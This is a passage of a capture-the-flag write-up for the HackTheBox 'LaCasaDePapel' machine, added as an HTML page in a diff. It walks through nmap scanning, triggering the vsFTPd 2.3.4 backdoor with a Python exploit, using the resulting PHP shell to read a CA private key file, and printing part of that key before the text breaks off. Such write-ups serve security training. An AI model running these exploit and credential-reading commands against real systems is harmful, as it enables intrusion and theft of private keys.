@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox LaCasaDePapel</strong></h1>
+        <em>Released: 22nd June 2019 / Pwned: July 4th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        I learnt quite a lot of new things doing this box, so credit should be given to the creator for that. However, ultimately I didn't like this box. Whether it was unintentional or not, it felt like there were lots of small ‘gotchas' throughout the challenge, like the details in the certificate signing request and the bait and switch with the ssh login. I think root was a clever, novel take on a classic priv-esc however, and that part I enjoyed.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Browse the websites at 80 and 443, realise you can't do anything for the time being<br>
+        • Run a backdoor exploit that opens up a door that we didn't expect<br>
+        • ls $japan, show $japan and sudo file_get_contents a key<br>
+        • Sign our client certificate using our retrieved key and access https/443<br>
+        • base64 file include a file from .ssh<br>
+        • Realise that .ssh is not for the user we originally thought<br>
+        • Make alternative copies of some files in order to run the code we need as the permissions that we need<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.131</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/lecasadepapel#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.131<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2019-06-19&nbsp;10:30&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.131<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.31s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;996&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                21/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd&nbsp;2.3.4<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.9&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4&nbsp;(ED25519)<br>
+                80/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Node.js&nbsp;(Express&nbsp;middleware)<br>
+                |_http-title:&nbsp;La&nbsp;Casa&nbsp;De&nbsp;Papel<br>
+                443/tcp&nbsp;open&nbsp;&nbsp;ssl/http&nbsp;Node.js&nbsp;Express&nbsp;framework<br>
+                |&nbsp;http-auth:&nbsp;<br>
+                |&nbsp;HTTP/1.1&nbsp;401&nbsp;Unauthorized\x0D<br>
+                |_&nbsp;&nbsp;Server&nbsp;returned&nbsp;status&nbsp;401&nbsp;but&nbsp;no&nbsp;WWW-Authenticate&nbsp;header.<br>
+                |_http-title:&nbsp;La&nbsp;Casa&nbsp;De&nbsp;Papel<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=lacasadepapel.htb/organizationName=La&nbsp;Casa&nbsp;De&nbsp;Papel<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2019-01-27T08:35:30<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2029-01-24T08:35:30<br>
+                |_ssl-date:&nbsp;TLS&nbsp;randomness&nbsp;does&nbsp;not&nbsp;represent&nbsp;time<br>
+                |&nbsp;tls-alpn:&nbsp;<br>
+                |_&nbsp;&nbsp;http/1.1<br>
+                |&nbsp;tls-nextprotoneg:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;http/1.1<br>
+                |_&nbsp;&nbsp;http/1.0<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;81.87&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        21/ftp is open, 22/ssh is open, 80/http is a Node.js website and 443/https is Node.js website but it looks like we can't access it - <code>HTTP/1.1 401 Unauthorized</code>.<br>
+        <br>
+        I tend to check websites first because they're a pretty reliable attack vector.<br>
+        I modified my /etc/hosts file so that <code>10.10.10.131</code>, the IP of LaCasaDePapel, points to <code>lacasadepapel.htb</code> so that I can browse using the domain name.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel#&nbsp;nano&nbsp;/etc/hosts<br>
+                ...<br>
+                #&nbsp;The&nbsp;following&nbsp;lines&nbsp;are&nbsp;desirable&nbsp;for&nbsp;IPv6&nbsp;capable&nbsp;hosts<br>
+                ...<br>
+                10.10.10.131&nbsp;lacasadepapel.htb
+            </div>
+        </div><br>
+        <br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://lacasadepapel.htb</code><br>
+        As far as I could find, there's absolutely nothing here.<br>
+        The QR code doesn't have anything, nor does the otp token.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 443/https</strong></h2><br>
+        <code>https://lacasadepapel.htb</code><br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Hmm, no access.<br>
+        We need to provide a client certificate in order to access the https/443 portion of the site.<br>
+        <br>
+        To produce a client certificate that will let us into <code>https://lacasadepapel.htb</code>, we need:<br>
+        • lacasadepapel's public certificate (which we can get using <code>openssl</code>)<br>
+        • lacasadepapel's private key (which we should never be able to get)<br>
+        • and our own public key, private key and certificate signing request (which we can generate ourselves using <code>openssl</code>)<br>
+        <br>
+        For now, this path is a dead-end because there's no way of us getting lacasadepapel's private key and creating a client certificate that will let us into the site.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) 21/ftp</strong></h2><br>
+        22/ssh isn't worth looking at, it's usually pretty locked down.<br>
+        <br>
+        <code>searchsploit</code> for vsFTPd 2.3.4 service vulnerabilities reveals a ‘Backdoor Command Execution' exploit.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lecasadepapel<span style="color:#ff9d00;font-weight:700">/</span>21ftp#&nbsp;nc&nbsp;10.10.10.131&nbsp;21<br>
+                220&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>vsFTPd&nbsp;2.3.4<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ^C<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lecasadepapel<span style="color:#ff9d00;font-weight:700">/</span>21ftp#&nbsp;searchsploit&nbsp;vsFTPd&nbsp;2.3.4<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                vsftpd&nbsp;2.3.4&nbsp;-&nbsp;Backdoor&nbsp;Command&nbsp;Execution&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Metasploit<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>unix<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>17491.rb<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result<br>
+            </div>
+        </div><br>
+        <br>
+        Metasploit can be a pain, so I googled for an alternative and used this python script trigger the backdoor instead:<br>
+        <a href="https://github.com/In2econd/vsftpd-2.3.4-exploit#vsftpd-234-exploit-python.">https://github.com/In2econd/vsftpd-2.3.4-exploit#vsftpd-234-exploit-python.</a><br>
+        Many thanks to In2econd for his script.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/21ftp#&nbsp;python3&nbsp;vsftpd_234_exploit.py&nbsp;10.10.10.131&nbsp;21&nbsp;whoami<br>
+                [*]&nbsp;Attempting&nbsp;to&nbsp;trigger&nbsp;backdoor...<br>
+                [+]&nbsp;Triggered&nbsp;backdoor<br>
+                [*]&nbsp;Attempting&nbsp;to&nbsp;connect&nbsp;to&nbsp;backdoor...<br>
+                [+]&nbsp;Connected&nbsp;to&nbsp;backdoor&nbsp;on&nbsp;10.10.10.131:6200<br>
+                [+]&nbsp;Response:<br>
+                Psy&nbsp;Shell&nbsp;v0.9.9&nbsp;(PHP&nbsp;7.2.10&nbsp;—&nbsp;cli)&nbsp;by&nbsp;Justin&nbsp;Hileman
+            </div>
+        </div><br>
+        <br>
+        Instead of a backdoor, we get an odd response.<br>
+        Try connecting to the service using netcat.<br>
+        <br>
+        <code>help</code> will help us out with some commands.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/21ftp#&nbsp;nc&nbsp;10.10.10.131&nbsp;6200<br>
+                Psy&nbsp;Shell&nbsp;v0.9.9&nbsp;(PHP&nbsp;7.2.10&nbsp;—&nbsp;cli)&nbsp;by&nbsp;Justin&nbsp;Hileman<br>
+                help<br>
+                &nbsp;&nbsp;help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;a&nbsp;list&nbsp;of&nbsp;commands.&nbsp;Type&nbsp;`help&nbsp;[foo]`&nbsp;for&nbsp;information&nbsp;about&nbsp;[foo].&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aliases:&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;ls&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&nbsp;local,&nbsp;instance&nbsp;or&nbsp;class&nbsp;variables,&nbsp;methods&nbsp;and&nbsp;constants.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aliases:&nbsp;list,&nbsp;dir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;dump&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dump&nbsp;an&nbsp;object&nbsp;or&nbsp;primitive.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;doc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Read&nbsp;the&nbsp;documentation&nbsp;for&nbsp;an&nbsp;object,&nbsp;class,&nbsp;constant,&nbsp;method&nbsp;or&nbsp;property.&nbsp;&nbsp;&nbsp;Aliases:&nbsp;rtfm,&nbsp;man&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;the&nbsp;code&nbsp;for&nbsp;an&nbsp;object,&nbsp;class,&nbsp;constant,&nbsp;method&nbsp;or&nbsp;property.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;wtf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;the&nbsp;backtrace&nbsp;of&nbsp;the&nbsp;most&nbsp;recent&nbsp;exception.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aliases:&nbsp;last-exception,&nbsp;wtf?&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;whereami&nbsp;&nbsp;&nbsp;Show&nbsp;where&nbsp;you&nbsp;are&nbsp;in&nbsp;the&nbsp;code.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;throw-up&nbsp;&nbsp;&nbsp;Throw&nbsp;an&nbsp;exception&nbsp;or&nbsp;error&nbsp;out&nbsp;of&nbsp;the&nbsp;Psy&nbsp;Shell.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;timeit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Profiles&nbsp;with&nbsp;a&nbsp;timer.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;trace&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;the&nbsp;current&nbsp;call&nbsp;stack.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;(or&nbsp;clear)&nbsp;the&nbsp;contents&nbsp;of&nbsp;the&nbsp;code&nbsp;input&nbsp;buffer.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aliases:&nbsp;buf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;clear&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Clear&nbsp;the&nbsp;Psy&nbsp;Shell&nbsp;screen.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;edit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Open&nbsp;an&nbsp;external&nbsp;editor.&nbsp;Afterwards,&nbsp;get&nbsp;produced&nbsp;code&nbsp;in&nbsp;input&nbsp;buffer.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;sudo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Evaluate&nbsp;PHP&nbsp;code,&nbsp;bypassing&nbsp;visibility&nbsp;restrictions.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;history&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;the&nbsp;Psy&nbsp;Shell&nbsp;history.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aliases:&nbsp;hist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;exit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;the&nbsp;current&nbsp;session&nbsp;and&nbsp;return&nbsp;to&nbsp;caller.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aliases:&nbsp;quit,&nbsp;q&nbsp;
+            </div>
+        </div><br>
+        <br>
+        This site helped me understand what this php shell is/what it can do - <a href="https://www.sitepoint.com/interactive-php-debugging-psysh/">https://www.sitepoint.com/interactive-php-debugging-psysh/</a><br>
+        <br>
+        Of everything listed by help, <code>ls</code>, <code>show</code> and <code>sudo</code> seem the most useful.<br>
+        <code>ls</code> will show us variables.<br>
+        <code>show</code> will show us code.<br>
+        <code>sudo</code> will execute php functions.<br>
+        <br>
+            <div class="codebox">
+                ls<br>
+                Variables:&nbsp;$tokyo<br>
+            </div>
+        </div><br>
+        <br>
+        There's a variable called $tokyo. Have a look at it.<br>
+            <div class="codebox">
+                show&nbsp;$tokyo<br>
+                &nbsp;&nbsp;&gt;&nbsp;2|&nbsp;class&nbsp;Tokyo&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;3|&nbsp; private&nbsp;function&nbsp;sign($caCert,$userCsr)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;4|&nbsp; $caKey&nbsp;=&nbsp;file_get_contents('/home/nairobi/ca.key');<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;5|&nbsp; $userCert&nbsp;=&nbsp;openssl_csr_sign($userCsr,&nbsp;$caCert,&nbsp;$caKey,&nbsp;365,&nbsp;['digest_alg'=&gt;'sha256']);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;6|&nbsp; openssl_x509_export($userCert,&nbsp;$userCertOut);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;7|&nbsp; return&nbsp;$userCertOut;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;8|&nbsp; }<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;9|&nbsp;}
+            </div>
+        </div><br>
+        <br>
+        Reading the 4th line, <code>/home/nairobi/ca.key</code> looks a like a certificate authority key.<br>
+        That key is exactly what we need to sign our certificate signing request and access the https/443 portion of the site.<br>
+        <br>
+        <code>sudo</code> lets us run php functions, so just copy what the code is doing to read the <code>ca.key</code> file.<br>
+            <div class="codebox">
+                sudo&nbsp;file_get_contents('/home/nairobi/ca.key')<br>
+                =&gt;&nbsp;"""<br>
+                &nbsp;&nbsp;&nbsp;-----BEGIN&nbsp;PRIVATE&nbsp;KEY-----\n<br>
+                &nbsp;&nbsp;&nbsp;MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n<br>
+                &nbsp;&nbsp;&nbsp;7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n<br>
+                &nbsp;&nbsp;&nbsp;2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n<br>
+                &nbsp;&nbsp;&nbsp;uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n<br>
